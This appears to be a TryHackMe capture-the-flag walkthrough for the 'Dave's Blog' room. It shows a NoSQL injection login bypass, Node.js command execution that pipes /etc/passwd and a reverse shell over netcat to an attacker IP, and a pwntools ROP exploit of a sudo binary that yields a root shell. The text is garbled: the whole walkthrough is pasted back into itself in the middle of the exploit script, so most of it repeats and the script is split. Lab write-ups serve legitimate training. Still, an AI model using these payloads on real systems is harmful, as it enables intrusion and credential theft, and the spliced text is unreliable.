---
published: true
title: Dave's Blog - TryHackMe Walkthrough
category: Writeup
author: F3dai
image: 'https://imgur.com/KRG9rBC.png'
---
Daves Blog - "My friend Dave made his own blog! You should go check it out. The machine may take a few minutes to fully start up."

**URL:** [Dave's Blog](https://tryhackme.com/room/davesblog)

**Difficulty:** Hard

**Author:** Jammy

## Enumeration

We are given the IP 10.10.54.82. Add this to the /etc/hosts file. Let's scan the open ports with the following command:

<pre>sudo nmap -p- -A dave.thm -o Portscan</pre>

<pre>PORT     STATE  SERVICE      VERSION
22/tcp   open   ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f9:31:1f:9f:b4:a1:10:9d:a9:69:ec:d5:97:df:1a:34 (RSA)
|   256 e9:f5:b9:9e:39:33:00:d2:7f:cf:75:0f:7a:6d:1c:d3 (ECDSA)
|_  256 44:f2:51:7f:de:78:94:b2:75:2b:a8:fe:25:18:51:49 (ED25519)
80/tcp   open   http         nginx 1.14.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Dave's Blog
3000/tcp open   http         Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: Dave's Blog
8989/tcp closed sunwebadmins
</pre>

Let's enumerate port 80:

![web page](https://imgur.com/U9dj7tV.png)

There is a user called "dave". It's worth mentioning that he is probably using NoSQL:

<pre>"I decided to build it with a NoSQL database"</pre>

Nmap identified "robots.txt" so let's check that out:

<pre>User-Agent: *
Disallow: /admin</pre>

Let's check out /admin page:

![/admin](https://imgur.com/XPw4brO.png)

I checked out port 3000 but it seems it is the same web page.

Look at the source code for /admin:

<pre>    if(document.location.hash) {
      const div = document.createElement('div')
      div.innerText = decodeURIComponent(document.location.hash.substr(1));
      div.className = 'note';
      document.body.insertBefore(div, document.body.firstChild);
    }
    document.querySelector('form').onsubmit = (e) => {
      /*e.preventDefault();
      const username = document.querySelector('input[type=text]').value;
      const password = document.querySelector('input[type=password]').value;

      fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({username, password})
      }).then(() => {
        location.reload();
      })
      return false;*/
    }</pre>
    
There is mention of 'Content-Type': 'application/json' so we can prepare a noSQL payload. I found this Github repo:

[NoSQL Injection - Github](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

Authentication Bypass:

<pre>in JSON
{"username": {"$ne": null}, "password": {"$ne": null}}</pre>

I copied the "fetch" block of the commented code we found in the source code and replaced the "username,password" to the payload. This is what my payload looks like:

<pre>fetch('', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify(
        {"username":"dave", "password":{"$ne": ""}}
    )
}).then(() => {
    location.reload();
})</pre>

![console](https://imgur.com/xVLSQpV.png)

We are redirected to this page:

![redirect](https://imgur.com/lVhXqlt.png)

We can grab the jwt cookie and decode it, I used the following website:

[JWT Decode - jwt.io](https://jwt.io/)

This is what we find:

<pre>{
  "isAdmin": true,
  "_id": "*****",
  "username": "dave",
  "password": "THM{*****}",
  "__v": 0,
  "iat": 1597593057
}</pre>

We are presented with an input field. Entering Unix commands gives us no response. 

I enter "1+1" and it gives us "2" so I made the assumption this is node.js.

From the following article, I found a way to execute my commands:

[Nodejs RCE Exploit - appsecco](https://blog.appsecco.com/nodejs-and-a-simple-rce-exploit-d79001837cc6)

I set up a netcat listener:

<pre>nc -nvlp 4444</pre>

Execute the following command:

<pre>require('child_process').exec('cat /etc/passwd | nc [YOUR IP] 4444')</pre>

We got this:

![netcat test](https://imgur.com/Rsziy6B.png)

We can confirm this works, so let's create a reverse shell. I tried a few different one liners but I found this one worked:

<pre>require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.6.63 4444  >/tmp/f ')</pre>

![reverse shell](https://imgur.com/CMnNwMW.png)

Upgrade the shell with the following command:

<pre>python -c 'import pty; pty.spawn("/bin/bash")'</pre>

The third flag can be found by searching the mongo database (with the command "mongo"). It's pretty obvious where to find it.

Running sudo -l gives us the following:

<pre>dave@daves-blog:/home$ sudo -l
sudo -l
Matching Defaults entries for dave on daves-blog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dave may run the following commands on daves-blog:
    (root) NOPASSWD: /uid_checker
</pre>

This is an ELF file. Running strings gave us the fourth flag. 

Let's transfer this to our local machine. I used netcat.

<pre>nc -nvlp 8888 > elf</pre>

On the remote host:

<pre>cat uid_checker | nc 10.9.6.63 8888</pre>

We have our binary / ELF. I run checksec on this file to find out about the properties of this executable:

<pre>checksec elf</pre>

![checksec](https://imgur.com/pgQinU8.png)

We can use a technique called **Return Oriented Programming (ROP)**. This essentially uses existing code in the executable to perform certain key functions for us.

In order to achieve this, we need to find a "Gadget". This is a chain which ends with **ret instruction c3**.

This is a good video explaining how this technique works:

[ROP exploit explained - Rapid7](https://www.rapid7.com/resources/rop-exploit-explained/)

I will be using **ropstar** to help exploit. 

[Ropstar - Github](https://github.com/xct/ropstar)

<pre>python3 ~/tools/ropstar/ropstar.py elf</pre>

We got some important information:

<pre>[*] Loaded 14 cached gadgets for 'elf'
[*] 0x0000:         0x400803 pop rdi; ret
    0x0008:         0x601060 [arg0] rdi = 6295648
    0x0010:         0x4005b0
    0x0018:         0x400803 pop rdi; ret
    0x0020:         0x601060 [arg0] rdi = 6295648
    0x0028:         0x400570
</pre>

Now that we have this information, we can use a script using the values we found to exploit this:

<pre>from pwn import cyclic
from pwnlib.tubes.ssh import ssh
from pwnlib.util.packing import p64

offset = 88 # Found with ropstar

payload = cyclic(offset)
payload += p64(0x400803) # pop r15; ret
payload += p64(0x601060) # .bss
payload += p64(0x4005b0) # gets()
payload += p64(0x400803) # pop r15; ret
payload += p64(0x601060) # .bss
payload += p64(0x400570) # system()

s = ssh(host='dave.thm', user='dave', keyfile='f3dai')
Daves Blog - "My friend Dave made his own blog! You should go check it out. The machine may take a few minutes to fully start up."

**URL:** [Dave's Blog](https://tryhackme.com/room/davesblog)

**Difficulty:** Hard

**Author:** Jammy

## Enumeration

We are given the IP 10.10.54.82. Add this to the /etc/hosts file. Let's scan the open ports with the following command:

<pre>sudo nmap -p- -A dave.thm -o Portscan</pre>

<pre>PORT     STATE  SERVICE      VERSION
22/tcp   open   ssh          OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f9:31:1f:9f:b4:a1:10:9d:a9:69:ec:d5:97:df:1a:34 (RSA)
|   256 e9:f5:b9:9e:39:33:00:d2:7f:cf:75:0f:7a:6d:1c:d3 (ECDSA)
|_  256 44:f2:51:7f:de:78:94:b2:75:2b:a8:fe:25:18:51:49 (ED25519)
80/tcp   open   http         nginx 1.14.0 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Dave's Blog
3000/tcp open   http         Node.js (Express middleware)
| http-robots.txt: 1 disallowed entry 
|_/admin
|_http-title: Dave's Blog
8989/tcp closed sunwebadmins
</pre>

Let's enumerate port 80:

![web page](https://imgur.com/U9dj7tV.png)

There is a user called "dave". It's worth mentioning that he is probably using NoSQL:

<pre>"I decided to build it with a NoSQL database"</pre>

Nmap identified "robots.txt" so let's check that out:

<pre>User-Agent: *
Disallow: /admin</pre>

Let's check out /admin page:

![/admin](https://imgur.com/XPw4brO.png)

I checked out port 3000 but it seems it is the same web page.

Look at the source code for /admin:

<pre>    if(document.location.hash) {
      const div = document.createElement('div')
      div.innerText = decodeURIComponent(document.location.hash.substr(1));
      div.className = 'note';
      document.body.insertBefore(div, document.body.firstChild);
    }
    document.querySelector('form').onsubmit = (e) => {
      /*e.preventDefault();
      const username = document.querySelector('input[type=text]').value;
      const password = document.querySelector('input[type=password]').value;

      fetch('', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({username, password})
      }).then(() => {
        location.reload();
      })
      return false;*/
    }</pre>
    
There is mention of 'Content-Type': 'application/json' so we can prepare a noSQL payload. I found this Github repo:

[NoSQL Injection - Github](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection)

Authentication Bypass:

<pre>in JSON
{"username": {"$ne": null}, "password": {"$ne": null}}</pre>

I copied the "fetch" block of the commented code we found in the source code and replaced the "username,password" to the payload. This is what my payload looks like:

<pre>fetch('', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
    },
    body: JSON.stringify(
        {"username":"dave", "password":{"$ne": ""}}
    )
}).then(() => {
    location.reload();
})</pre>

![console](https://imgur.com/xVLSQpV.png)

We are redirected to this page:

![redirect](https://imgur.com/lVhXqlt.png)

We can grab the jwt cookie and decode it, I used the following website:

[JWT Decode - jwt.io](https://jwt.io/)

This is what we find:

<pre>{
  "isAdmin": true,
  "_id": "*****",
  "username": "dave",
  "password": "THM{*****}",
  "__v": 0,
  "iat": 1597593057
}</pre>

We are presented with an input field. Entering Unix commands gives us no response. 

I enter "1+1" and it gives us "2" so I made the assumption this is node.js.

From the following article, I found a way to execute my commands:

[Nodejs RCE Exploit - appsecco](https://blog.appsecco.com/nodejs-and-a-simple-rce-exploit-d79001837cc6)

I set up a netcat listener:

<pre>nc -nvlp 4444</pre>

Execute the following command:

<pre>require('child_process').exec('cat /etc/passwd | nc [YOUR IP] 4444')</pre>

We got this:

![netcat test](https://imgur.com/Rsziy6B.png)

We can confirm this works, so let's create a reverse shell. I tried a few different one liners but I found this one worked:

<pre>require('child_process').exec('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.9.6.63 4444  >/tmp/f ')</pre>

![reverse shell](https://imgur.com/CMnNwMW.png)

Upgrade the shell with the following command:

<pre>python -c 'import pty; pty.spawn("/bin/bash")'</pre>

The third flag can be found by searching the mongo database (with the command "mongo"). It's pretty obvious where to find it.

Running sudo -l gives us the following:

<pre>dave@daves-blog:/home$ sudo -l
sudo -l
Matching Defaults entries for dave on daves-blog:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dave may run the following commands on daves-blog:
    (root) NOPASSWD: /uid_checker
</pre>

This is an ELF file. Running strings gave us the fourth flag. 

Let's transfer this to our local machine. I used netcat.

<pre>nc -nvlp 8888 > elf</pre>

On the remote host:

<pre>cat uid_checker | nc 10.9.6.63 8888</pre>

We have our binary / ELF. I run checksec on this file to find out about the properties of this executable:

<pre>checksec elf</pre>

![checksec](https://imgur.com/pgQinU8.png)

We can use a technique called **Return Oriented Programming (ROP)**. This essentially uses existing code in the executable to perform certain key functions for us.

In order to achieve this, we need to find a "Gadget". This is a chain which ends with **ret instruction c3**.

This is a good video explaining how this technique works:

[ROP exploit explained - Rapid7](https://www.rapid7.com/resources/rop-exploit-explained/)

I will be using **ropstar** to help exploit. 

[Ropstar - Github](https://github.com/xct/ropstar)

<pre>python3 ~/tools/ropstar/ropstar.py elf</pre>

We got some important information:

<pre>[*] Loaded 14 cached gadgets for 'elf'
[*] 0x0000:         0x400803 pop rdi; ret
    0x0008:         0x601060 [arg0] rdi = 6295648
    0x0010:         0x4005b0
    0x0018:         0x400803 pop rdi; ret
    0x0020:         0x601060 [arg0] rdi = 6295648
    0x0028:         0x400570
</pre>

Now that we have this information, we can use a script using the values we found to exploit this:

<pre>from pwn import cyclic
from pwnlib.tubes.ssh import ssh
from pwnlib.util.packing import p64

offset = 88 # Found with ropstar

payload = cyclic(offset)
payload += p64(0x400803) # pop r15; ret
payload += p64(0x601060) # .bss
payload += p64(0x4005b0) # gets()
payload += p64(0x400803) # pop r15; ret
payload += p64(0x601060) # .bss
payload += p64(0x400570) # system()

s = ssh(host='dave.thm', user='dave', keyfile='f3dai')

p = s.process(['sudo', '/uid_checker'])
print(p.recv())
p.sendline(payload)
print(p.recv())
p.sendline("/bin/sh")
p.interactive(prompt='')</pre>

Notice how we will be using SSH with 

<pre>s = ssh(host='dave.thm', user='dave', keyfile='./f3dai')</pre>

You must create a directory under Dave's home directory and add your ssh key to authorized_keys. 

Please note, I had to use ssh-keygen to convert my key to the classic OpenSSH format to allow pwntools to connect via SSH:

<pre>ssh-keygen -p -f f3dai -m pem -P "" -N ""</pre>

Executing our script gives us a root shell:

![root!](https://imgur.com/hPs8yRA.png)

Thank you for reading!





p = s.process(['sudo', '/uid_checker'])
print(p.recv())
p.sendline(payload)
print(p.recv())
p.sendline("/bin/sh")
p.interactive(prompt='')</pre>

Notice how we will be using SSH with 

<pre>s = ssh(host='dave.thm', user='dave', keyfile='./f3dai')</pre>

You must create a directory under Dave's home directory and add your ssh key to authorized_keys. 

Please note, I had to use ssh-keygen to convert my key to the classic OpenSSH format to allow pwntools to connect via SSH:

<pre>ssh-keygen -p -f f3dai -m pem -P "" -N ""</pre>

Executing our script gives us a root shell:

![root!](https://imgur.com/hPs8yRA.png)

Thank you for reading!
